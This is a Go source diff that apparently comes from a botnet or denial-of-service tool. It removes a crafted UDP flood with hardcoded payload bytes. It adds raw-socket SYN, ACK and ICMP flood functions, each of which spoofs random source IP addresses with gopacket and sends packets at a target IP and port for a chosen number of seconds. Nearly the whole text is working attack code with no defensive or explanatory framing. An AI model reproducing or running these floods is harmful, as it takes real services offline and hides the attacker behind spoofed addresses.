@@ -7,14 +7,24 @@ import (
 	"net"
 	myhttp "net/http"
 	"strconv"
-	"strings"
 	"time"
+
+	"github.com/google/gopacket"
+	"github.com/google/gopacket/layers"
 )
 
-var (
-	udprapepacket         = []byte{0x5b, 0xa3, 0xd6, 0xee, 0x20, 0xc8, 0x48, 0x17, 0x5f, 0x3a, 0xba, 0x64, 0xfc, 0xac, 0xd3, 0x1b, 0x6e, 0x56, 0x88, 0x40, 0xf0, 0x6f, 0xd7, 0xb2, 0x22, 0xac, 0x94, 0x34, 0x2b, 0x73, 0xc6, 0xde, 0xf0, 0x78, 0x58, 0xe7, 0x2f, 0xea, 0x2a, 0x34, 0xac, 0x7c, 0xa3, 0xeb, 0x1e, 0x06, 0x98, 0xf0, 0xc0, 0x7f, 0xa7, 0x62, 0xd2, 0xfc, 0x04, 0x04, 0x3b, 0x83, 0xb6, 0x8e, 0x40, 0x28, 0x68, 0xf7, 0x3f, 0x1a, 0x5a, 0x84, 0x5c, 0x4c, 0x33, 0xfb, 0x4e, 0xf6, 0xa8, 0xa0, 0x90, 0xcf, 0xb7, 0x92, 0xc2, 0xcc, 0xf4, 0xd4, 0x8b, 0xd3, 0x26, 0x7e, 0x10, 0x58, 0xf8, 0x47, 0x8f, 0x4a, 0x4a, 0x54, 0x8c, 0x9c, 0x03, 0x4b, 0x7e, 0x26, 0x38, 0xd0, 0xe0, 0xdf, 0x07, 0xc2, 0xf2, 0x9c, 0xe4, 0x24, 0x9b, 0x63, 0x16, 0xae, 0xe0, 0x88, 0x88, 0x57, 0x1f, 0x7a, 0x7a, 0x24, 0xbc, 0xec, 0x13, 0xdb, 0xae, 0x16, 0x48, 0x00, 0x30, 0xaf, 0x97, 0xf2, 0xe2, 0x6c, 0x54, 0x74, 0x6b, 0x33, 0x06, 0x9e, 0xb0, 0x38, 0x98, 0x27, 0xef, 0x2a, 0xea, 0xf4, 0x6c, 0xbc, 0xe3, 0xab, 0x5e, 0xc6, 0x58, 0xb0, 0x00, 0xbf, 0x67, 0xa2, 0x92, 0xbc, 0xc4, 0x44, 0x7b, 0x43, 0xf6, 0x4e, 0x00, 0xe8, 0xa8, 0x37, 0x68, 0x90, 0x6e, 0xc6, 0xba, 0x75, 0x71, 0xbc, 0x4c, 0xc2, 0x6a, 0x2e, 0x41, 0xbd, 0xe0, 0x18, 0xf6, 0x9e, 0x82, 0xed, 0x89, 0x54, 0xd4, 0x2a, 0xe2, 0xd6, 0x79, 0x35, 0x98, 0x80, 0x7e, 0x36, 0x0a, 0x45, 0xc1, 0xac, 0x3c, 0x92, 0x5a, 0x3e, 0x11, 0x8d, 0xd0, 0x88, 0xc6, 0x4e, 0x92, 0xbd, 0x59, 0x04, 0x84, 0x3a, 0x92, 0xa6, 0x89, 0x05, 0x48, 0x30, 0x8e, 0xa6, 0xda, 0x55, 0xd1, 0x9c, 0xec, 0xe2, 0xca, 0x4e, 0x21, 0x9d, 0xc0, 0xb8, 0x16, 0xfe, 0x22, 0x4d, 0x69, 0x34, 0x74, 0x4a, 0x42, 0x76, 0xd9, 0x15, 0x78, 0x20, 0x9e, 0x96, 0xaa, 0xa5, 0x21, 0x0c, 0xdc, 0xb2, 0xba, 0xde, 0x71, 0xed, 0x30, 0xa8, 0xe6, 0x2e, 0x32, 0x1d, 0xb9, 0x64, 0xa4, 0xda, 0x72, 0xc6, 0xe9, 0x65, 0xa8, 0x50, 0x2e, 0x86, 0xfa, 0xb5, 0x31, 0xfc, 0x0c, 0x82, 0x2a, 0x6e, 0x81, 0x7d, 0x20, 0xd8, 0xb6, 0x5e, 0xc2, 0x2d, 0x49, 0x94, 0x94, 0xea, 0xa2, 0x16, 0xb9, 0xf5, 0xd8, 0x40, 0x3e, 0xf6, 0x4a, 0x85, 0x81, 0xec}
-	udprapecraftedpacket2 = []byte{0x5b, 0xa3, 0xd6, 0xee, 0x20, 0xc8, 0x48, 0x17, 0x5f, 0x3a, 0xba, 0x64, 0xfc, 0xac, 0xd3, 0x1b, 0x6e, 0x56, 0x88, 0x40, 0xf0, 0x6f, 0xd7, 0xb2, 0x22, 0xac, 0x94, 0x34, 0x2b, 0x73, 0xc6, 0xde, 0xf0, 0x78, 0x58, 0xe7, 0x2f, 0xea, 0x2a, 0x34, 0xac, 0x7c, 0xa3, 0xeb, 0x1e, 0x06, 0x98, 0xf0, 0xc0, 0x7f, 0xa7, 0x62, 0xd2, 0xfc, 0x04, 0x04, 0x3b, 0x83, 0xb6, 0x8e}
-)
+func randomIPv4Address() net.IP {
+	// Seed the random number generator
+	seed := time.Now().UnixNano()
+	r := rand.New(rand.NewSource(seed))
+
+	return net.IPv4(
+		byte(r.Intn(256)),
+		byte(r.Intn(256)),
+		byte(r.Intn(256)),
+		byte(r.Intn(256)),
+	)
+}
 
 // random packets
 func generate_random_string(length int) string {
@@ -68,37 +78,192 @@ func UDP(ip string, port string, dur string) {
 func SYN(ip string, port string, dur string) {
 	newdur, err := strconv.Atoi(dur)
 	if err != nil {
-		log.Println(err)
+		log.Println("Duration conversion error:", err)
 		return
 	}
 
-	start_time := time.Now()
-	timeout := start_time.Add(time.Duration(newdur) * time.Second)
-	for time.Now().Before(timeout) {
-		conn, err := net.Dial("tcp", ip+":"+port)
-		if err == nil {
-			conn.Close()
+	newport, err := strconv.Atoi(port)
+	if err != nil {
+		log.Println("Port conversion error:", err)
+		return
+	}
+
+	dstIP := net.ParseIP(ip)
+	if dstIP == nil {
+		log.Println("Invalid IP address")
+		return
+	}
+
+	// Open a raw socket
+	conn, err := net.DialIP("ip4:tcp", nil, &net.IPAddr{IP: net.IPv4(0, 0, 0, 0)})
+	if err != nil {
+		log.Fatal("DialIP error:", err)
+	}
+	defer conn.Close()
+
+	end := time.Now().Add(time.Duration(newdur) * time.Second)
+	r := rand.New(rand.NewSource(time.Now().UnixNano()))
+
+	for time.Now().Before(end) {
+		// Create a TCP layer with random source port for each packet
+		srcPort := layers.TCPPort(r.Intn(65535-1024) + 1024)
+		tcpLayer := &layers.TCP{
+			SrcPort: srcPort,
+			DstPort: layers.TCPPort(newport),
+			SYN:     true,
+			Seq:     r.Uint32(),
+			Window:  14600,
+		}
+
+		ipLayer := &layers.IPv4{
+			SrcIP:    randomIPv4Address(),
+			DstIP:    dstIP,
+			Protocol: layers.IPProtocolTCP,
+		}
+
+		// Set the TCP layer to compute the checksum with the context of the IPv4 layer
+		tcpLayer.SetNetworkLayerForChecksum(ipLayer)
+
+		// Serialize layers and create packet
+		packet := gopacket.NewSerializeBuffer()
+		options := gopacket.SerializeOptions{
+			FixLengths:       true,
+			ComputeChecksums: true,
+		}
+		err = gopacket.SerializeLayers(packet, options, ipLayer, tcpLayer)
+		if err != nil {
+			log.Println("SerializeLayers error:", err)
+			continue
+		}
+
+		// Send packet
+		if _, err := conn.Write(packet.Bytes()); err != nil {
+			log.Println("Error sending packet:", err)
+			continue
 		}
 	}
 }
 
-// CRAFTED UPD flood
-func UDPRAPE(ip string, port string, dur string) {
+func ACK(ip string, port string, dur string) {
+	newdur, err := strconv.Atoi(dur)
+	if err != nil {
+		log.Println("Duration conversion error:", err)
+		return
+	}
+
+	newport, err := strconv.Atoi(port)
+	if err != nil {
+		log.Println("Port conversion error:", err)
+		return
+	}
+
+	dstIP := net.ParseIP(ip)
+	if dstIP == nil {
+		log.Println("Invalid IP address")
+		return
+	}
+
+	// Open a raw socket
+	conn, err := net.DialIP("ip4:tcp", nil, &net.IPAddr{IP: net.IPv4(0, 0, 0, 0)})
+	if err != nil {
+		log.Fatal("DialIP error:", err)
+	}
+	defer conn.Close()
+
+	end := time.Now().Add(time.Duration(newdur) * time.Second)
+	r := rand.New(rand.NewSource(time.Now().UnixNano()))
+
+	for time.Now().Before(end) {
+		// Create a TCP layer with random source port for each packet
+		srcPort := layers.TCPPort(r.Intn(65535-1024) + 1024)
+		tcpLayer := &layers.TCP{
+			SrcPort: srcPort,
+			DstPort: layers.TCPPort(newport),
+			ACK:     true,
+			Seq:     r.Uint32(),
+			Window:  14600,
+		}
+
+		ipLayer := &layers.IPv4{
+			SrcIP:    randomIPv4Address(),
+			DstIP:    dstIP,
+			Protocol: layers.IPProtocolTCP,
+		}
+
+		// Set the TCP layer to compute the checksum with the context of the IPv4 layer
+		tcpLayer.SetNetworkLayerForChecksum(ipLayer)
+
+		// Serialize layers and create packet
+		packet := gopacket.NewSerializeBuffer()
+		options := gopacket.SerializeOptions{
+			FixLengths:       true,
+			ComputeChecksums: true,
+		}
+		err = gopacket.SerializeLayers(packet, options, ipLayer, tcpLayer)
+		if err != nil {
+			log.Println("SerializeLayers error:", err)
+			continue
+		}
+
+		// Send packet
+		if _, err := conn.Write(packet.Bytes()); err != nil {
+			log.Println("Error sending packet:", err)
+			continue
+		}
+	}
+}
+
+func ICMP(ip string, dur string) {
+	dstIP := net.ParseIP(ip) // Example IP address for ICMP destination
+
 	newdur, err := strconv.Atoi(dur)
 	if err != nil {
 		log.Println(err)
 		return
 	}
-	packetSize := 1000
 
-	packetData := strings.Repeat("\xfe", packetSize)
+	if dstIP == nil {
+		log.Println("Invalid IP address")
+		return
+	}
+
+	ipLayer := &layers.IPv4{
+		SrcIP:    randomIPv4Address(),
+		DstIP:    dstIP,
+		Protocol: layers.IPProtocolICMPv4,
+	}
+
+	icmpLayer := &layers.ICMPv4{
+		TypeCode: layers.CreateICMPv4TypeCode(layers.ICMPv4TypeEchoRequest, 0),
+	}
+
+	packet := gopacket.NewSerializeBuffer()
+	options := gopacket.SerializeOptions{
+		FixLengths:       true,
+		ComputeChecksums: true,
+	}
+
+	err = gopacket.SerializeLayers(packet, options, ipLayer, icmpLayer)
+
+	if err != nil {
+		log.Println(err)
+		return
+	}
+
+	// Open a raw socket
+	conn, err := net.DialIP("ip4:icmp", nil, &net.IPAddr{IP: net.IPv4(0, 0, 0, 0)})
+	if err != nil {
+		log.Println(err)
+		return
+	}
+	defer conn.Close()
+
+	// Send the ICMP packet
+
 	end := time.Now().Add(time.Duration(newdur) * time.Second)
+
 	for time.Now().Before(end) {
-		conn, _ := net.Dial("udp", fmt.Sprintf("%s:%s", ip, port))
-		conn.Write([]byte(packetData))
-		conn.Write(udprapepacket)
-		conn.Write(udprapecraftedpacket2)
-		conn.Close()
+		conn.Write(packet.Bytes())
 	}
 }
 
